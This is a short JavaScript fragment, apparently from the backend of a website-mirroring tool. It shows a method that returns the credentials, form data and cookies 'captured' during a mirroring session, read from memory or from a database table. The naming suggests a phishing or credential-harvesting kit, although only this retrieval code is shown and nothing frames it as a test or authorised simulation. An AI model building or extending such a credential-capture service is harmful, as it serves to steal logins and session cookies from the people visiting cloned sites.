  
  /**
   * Get captured credentials for a session
   */
  async getCapturedCredentials(sessionId) {
    // Try to find the session token
    let sessionToken = null;
    for (const [token, session] of this.activeSessions.entries()) {
      if (session.sessionId === sessionId) {
        sessionToken = token;
        break;
      }
    }
    
    // Get captures from memory if available
    if (sessionToken && this.captures.has(sessionToken)) {
      return this.captures.get(sessionToken);
    }
    
    // Otherwise try to get from database
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT captured_data FROM WebsiteMirroringSessions WHERE id = ?`,
        [sessionId],
        (err, row) => {
          if (err) reject(err);
          else if (row && row.captured_data) {
            try {
              resolve(JSON.parse(row.captured_data));
            } catch (e) {
              resolve({ credentials: [], formData: [], cookies: [] });
            }
          } else {
            resolve({ credentials: [], formData: [], cookies: [] });
          }
        }
      );
    });
  }
}

module.exports = new WebsiteMirroringService();